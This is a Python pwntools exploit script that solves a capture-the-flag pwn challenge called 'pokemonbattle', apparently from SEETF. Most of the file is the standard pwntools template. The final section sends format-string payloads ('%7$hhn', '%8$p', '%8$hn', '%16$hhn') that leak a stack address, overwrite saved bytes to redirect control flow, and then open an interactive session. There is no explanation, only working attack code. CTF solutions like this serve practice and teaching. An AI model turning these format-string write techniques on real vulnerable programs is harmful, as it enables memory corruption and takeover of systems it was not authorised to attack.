#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host fun.chall.seetf.sg --port 50005 ./pokemonbattle
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pokemonbattle')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'fun.chall.seetf.sg'
port = int(args.PORT or 50005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
# b *0x555555555263
# c
# c
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
# 0x00005555555552be
# 0x70
p ='%{}c%7$hhn'.format(0x70)
assert(len(p)<=13)
io.sendlineafter(": ",p)

p ='%8$p'
assert(len(p)<=12)
io.sendlineafter(": ",p)
stack = int(io.recvuntil(", ",drop=True),16) - 0x78 
print(hex(stack))

p ='%{}c%8$hn'.format(stack%0x10000)
assert(len(p)<=12)
io.sendlineafter(": ",p)

p ='%{}c%16$hhn'.format(0xbe+5)
assert(len(p)<=12)
io.sendlineafter(": ",p)

io.interactive()

